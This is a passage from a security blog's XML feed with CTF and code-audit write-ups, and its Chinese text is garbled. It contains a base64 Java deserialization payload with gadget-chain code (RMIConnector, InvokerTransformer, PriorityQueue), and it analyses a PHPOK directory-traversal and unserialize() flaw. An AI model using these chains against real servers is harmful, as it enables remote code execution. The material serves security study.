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&quot;</span>;</span><br><span class="line">        RMIConnector rmiConnector=<span class="keyword">new</span> <span class="title class_">RMIConnector</span>(<span class="keyword">new</span> <span class="title class_">JMXServiceURL</span>(<span class="string">&quot;service:jmx:rmi://localhost:9999/stub/&quot;</span>+exp),map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">InvokerTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer));</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;connect&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queueArray[<span class="number">0</span>] = rmiConnector;</span><br><span class="line">        queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">ser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(ser);</span><br><span class="line">        oser.writeObject(queue);</span><br><span class="line">        oser.close();</span><br><span class="line">        System.out.println(ser);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(ser.toByteArray()));</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(Base64.getDecoder().decode(Base64.getEncoder().encodeToString(ser.toByteArray())))).readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BY-æ’æ˜Ÿå®éªŒå®¤&quot;&gt;&lt;a href=&quot;#BY-æ’æ˜Ÿå®éªŒå®¤&quot; class=&quot;headerlink&quot; title=&quot;BY æ’æ˜Ÿå®éªŒå®¤&quot;&gt;&lt;/a&gt;BY æ’æ˜Ÿå®éªŒå®¤&lt;/h1&gt;&lt;h2 id=&quot;é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹-yu22x&quot;&gt;&lt;a href=&quot;#é«˜æ‰‹é«˜æ‰‹é«˜é«˜æ‰‹-yu22x&quot; c</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="PHPååºåˆ—åŒ–" scheme="https://lhhxs.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="WEB" scheme="https://lhhxs.github.io/tags/WEB/"/>
    
  </entry>
  
  <entry>
    <title>å‰å°ååºåˆ—åŒ–ä»£ç å®¡è®¡</title>
    <link href="https://lhhxs.github.io/2022/09/09/WEB/%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://lhhxs.github.io/2022/09/09/WEB/%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2022-09-09T15:44:11.886Z</published>
    <updated>2022-09-09T15:50:05.146Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸€ç›´åœ¨å¿™æ¯•è®¾ï¼Œå¾ˆä¹…æ²¡çœ‹å®‰å…¨äº†ï¼Œçœ‹ä¸ªPHPä»£ç å®¡è®¡ç»ƒç»ƒæ‰‹ï¼Œå‚è€ƒè‡ª<a href="https://susec.me/2022/03/13/phpok6-0-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/">è‹å®‰çš„åšå®¢</a>ã€‚</p><p>åŸºç¡€æ¡†æ¶ä¾ç„¶æ˜¯MVCï¼Œæ§åˆ¶å™¨éƒ½åœ¨_framework&#x2F;<em>ä¸‹ï¼Œè·¯ç”±æ–¹å¼æ˜¯</em>&#x2F;admin.php?c&#x3D;login&amp;f&#x3D;index_ï¼Œå¯¹åº”_framework&#x2F;admin&#x2F;login_control.php_ä¸‹çš„_index_f_æ–¹æ³•ã€‚</p><h3 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h3><p>æ¼æ´ç‚¹åœ¨_admin.php?c&#x3D;login&amp;f&#x3D;update_</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$login_time</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;login_time&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$login_time</span>)&#123;</span><br><span class="line"><span class="variable">$login_time</span> = <span class="number">1440</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$fid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;fid&#x27;</span>);</span><br><span class="line"><span class="variable">$fcode</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;fcode&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fid</span> &amp;&amp; !<span class="variable">$fcode</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;ç™»å½•æ•°æ®ä¸å®Œæ•´&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$quickcode</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;quickcode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$quickcode</span>)&#123;</span><br><span class="line"><span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;dir_cache.<span class="variable">$fid</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;éªŒè¯æ–‡ä»¶ä¸¢å¤±ï¼Œè¯·é‡æ–°æ‰«ç &#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$keyid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;file&#x27;</span>)-&gt;<span class="title function_ invoke__">cat</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">keyid</span>(<span class="variable">$keyid</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">decode</span>(<span class="variable">$quickcode</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$msg</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$msg</span>) || !<span class="variable">$msg</span>[<span class="string">&#x27;id&#x27;</span>] || !<span class="variable">$msg</span>[<span class="string">&#x27;user&#x27;</span>] || !<span class="variable">$msg</span>[<span class="string">&#x27;time&#x27;</span>] || !<span class="variable">$msg</span>[<span class="string">&#x27;domain&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;æ•°æ®è§£ç å¤±è´¥&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¶…è¿‡30å¤©ï¼Œå‘ŠçŸ¥æ— æ•ˆ</span></span><br><span class="line"><span class="variable">$time</span> = <span class="variable language_">$this</span>-&gt;time - <span class="variable">$msg</span>[<span class="string">&#x27;time&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$time</span>&gt;(<span class="number">30</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;æ•°æ®è¶…è¿‡30å¤©ï¼Œè¯·é‡æ–°ç™»å½•&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$domain</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_domain</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span>[<span class="string">&#x27;domain&#x27;</span>] != <span class="variable">$domain</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;æ•°æ®æ¥æºä¸å‡†ç¡®&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">get_one</span>(<span class="variable">$msg</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$rs</span> || <span class="variable">$rs</span>[<span class="string">&#x27;account&#x27;</span>] != <span class="variable">$msg</span>[<span class="string">&#x27;user&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;è´¦å·ä¸ä¸€è‡´&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line"><span class="variable">$pass</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;pass&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$user</span> || !<span class="variable">$pass</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;è´¦å·/å¯†ç ä¸èƒ½ä¸ºç©º&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">model</span>(<span class="string">&#x27;admin&#x27;</span>)-&gt;<span class="title function_ invoke__">get_one_from_name</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$rs</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;ç®¡ç†å‘˜ä¿¡æ¯ä¸å­˜åœ¨&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$rs</span>[<span class="string">&quot;status&quot;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&quot;ç®¡ç†å‘˜è´¦å·å·²è¢«é”å®šï¼Œè¯·è”ç³»è¶…ç®¡&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">password_check</span>(<span class="variable">$pass</span>,<span class="variable">$rs</span>[<span class="string">&quot;pass&quot;</span>]))&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="title function_ invoke__">P_Lang</span>(<span class="string">&#x27;ç®¡ç†å‘˜å¯†ç è¾“å…¥ä¸æ­£ç¡®&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$domain</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_domain</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>=&gt;<span class="variable">$rs</span>[<span class="string">&#x27;id&#x27;</span>],<span class="string">&#x27;user&#x27;</span>=&gt;<span class="variable">$rs</span>[<span class="string">&#x27;account&#x27;</span>],<span class="string">&#x27;time&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;time);</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;domain&#x27;</span>] = <span class="variable">$domain</span>;</span><br><span class="line"><span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;site[<span class="string">&#x27;api_code&#x27;</span>])&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">keyid</span>(<span class="variable">$this</span>-&gt;site[<span class="string">&#x27;api_code&#x27;</span>]);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">expiry</span>(<span class="number">30</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;token&#x27;</span>)-&gt;<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ é™¤checkingæ–‡ä»¶ï¼Œåˆ›å»ºç™»å½•æ–‡ä»¶</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;file&#x27;</span>)-&gt;<span class="title function_ invoke__">rm</span>(<span class="variable">$this</span>-&gt;dir_cache.<span class="variable">$fid</span>.<span class="string">&#x27;-checking.php&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;online&#x27;</span>] = <span class="variable">$login_time</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;file&#x27;</span>)-&gt;<span class="title function_ invoke__">vim</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">lib</span>(<span class="string">&#x27;json&#x27;</span>)-&gt;<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>),<span class="variable">$this</span>-&gt;dir_cache.<span class="variable">$fid</span>.<span class="string">&#x27;-&#x27;</span>.<span class="variable">$fcode</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="variable">$content</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆéœ€è¦ä¼ å…¥<code>$fid</code>ä»¥åŠ<code>$fcode</code>ä¸¤ä¸ªå‚æ•°ï¼Œä¸”<code>$fid</code>æ–‡ä»¶å¿…é¡»å­˜åœ¨åœ¨cacheç›®å½•ä¸‹ï¼Œè¿™é‡Œå¯ä»¥ç”¨ç›®å½•ç©¿è¶Šç»•è¿‡ã€‚</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/03/image.png"></p><p>ä¹‹åè¦æåˆ°ä¸€ä¸ªå¾ˆé‡è¦çš„å‡½æ•°å°±æ˜¯<code>lib()</code>ï¼Œè·Ÿè¿›åæ˜¯åœ¨å…¨å±€å˜é‡<code>$app</code>ï¼Œè°ƒç”¨__init_phpok.php_ä¸‹çš„<code>_init_phpok</code>ç±»ä¸­çš„<code>lib()</code>å‡½æ•°ï¼Œæˆ‘ä»¬åˆ†æä¸€ä¸‹åœ¨<code>update_f()</code>ä¸­çš„<code>$keyid</code>èµ‹å€¼è¿™é‡Œã€‚</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/03/image-1.png"></p><p>åœ¨<code>$lib</code>ä¸­ï¼Œå¯¹<code>$config</code>è¿›è¡Œèµ‹å€¼</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/03/image-2-1024x413.png"></p><p>æœ€åè¿”å›ï¼š</p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/03/image-3.png"></p><p>éšåè¿›å…¥_file.php_ä¸­çš„<code>cat()</code>å‡½æ•°ï¼Œå½“æˆ‘ä»¬ä¼ å…¥çš„æ˜¯_index.php_æ–‡ä»¶æ—¶ï¼Œè¿™é‡Œçš„å¤„ç†æ˜¯è·å¾—æ–‡ä»¶å†…å®¹å¹¶åšä¸€å®šçš„å¤„ç†åï¼ˆå½“ä¸º_index.php_æ—¶æ— å¤„ç†ï¼‰è¿”å›ã€‚</p><p>ä¹‹åçš„<code>keyid()</code>å¯¹ä¼ å…¥çš„æ–‡ä»¶å†…å®¹è¿›è¡Œå¤„ç†ï¼Œè·å¾—md5å€¼ï¼Œç”±äºé€‰æ‹©çš„æ–‡ä»¶æ˜¯ä¸€å®šçš„ï¼Œæ‰€ä»¥è·å¾—çš„md5å€¼ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p><p>è·Ÿè¿›decodeï¼Œè¿™é‡Œå­˜åœ¨<code>unserialize()</code>ååºåˆ—åŒ–ç‚¹ï¼Œé€†å‘è¿‡ç¨‹å¯ä»¥è°ƒç”¨_token.php_çš„<code>encode()</code>å‡½æ•°ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è§£å¯†</span></span><br><span class="line"><span class="comment"> * @å‚æ•° $string è¦è§£å¯†çš„å­—ä¸²</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;encode_type == <span class="string">&#x27;public_key&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decode_rsa</span>(<span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;keyid)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="variable">$keyc</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">0</span>, <span class="variable">$this</span>-&gt;keyc_length);</span><br><span class="line"><span class="variable">$string</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="variable">$this</span>-&gt;keyc_length));</span><br><span class="line"><span class="variable">$cryptkey</span> = <span class="variable language_">$this</span>-&gt;keya.<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;keya.<span class="variable">$keyc</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">core</span>(<span class="variable">$string</span>,<span class="variable">$cryptkey</span>);</span><br><span class="line"><span class="variable">$chkb</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$rs</span>,<span class="number">26</span>).<span class="variable">$this</span>-&gt;keyb),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="title function_ invoke__">substr</span>(<span class="variable">$rs</span>, <span class="number">0</span>, <span class="number">10</span>) - <span class="variable language_">$this</span>-&gt;time &gt; <span class="number">0</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$rs</span>, <span class="number">10</span>, <span class="number">16</span>) == <span class="variable">$chkb</span>)&#123;</span><br><span class="line"><span class="variable">$info</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$rs</span>, <span class="number">26</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$info</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸€ç›´åœ¨å¿™æ¯•è®¾ï¼Œå¾ˆä¹…æ²¡çœ‹å®‰å…¨äº†ï¼Œçœ‹ä¸ªPHPä»£ç å®¡è®¡ç»ƒç»ƒæ‰‹ï¼Œå‚è€ƒè‡ª&lt;a href=&quot;https://susec.me/2022/03/13/phpok6-0-%E5%89%8D%E5%8F%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC</summary>
      
    
    
    
    <category term="WEB" scheme="https://lhhxs.github.io/categories/WEB/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://lhhxs.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="PHPååºåˆ—åŒ–" scheme="https://lhhxs.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Burp Collaborator-å¸¦å¤–æŠ€æœ¯å·¥å…·</title>
    <link href="https://lhhxs.github.io/2022/09/09/WEB/Burp%20Collaborator-%E5%B8%A6%E5%A4%96%E6%8A%80%E6%9C%AF%E5%B7%A5%E5%85%B7/"/>
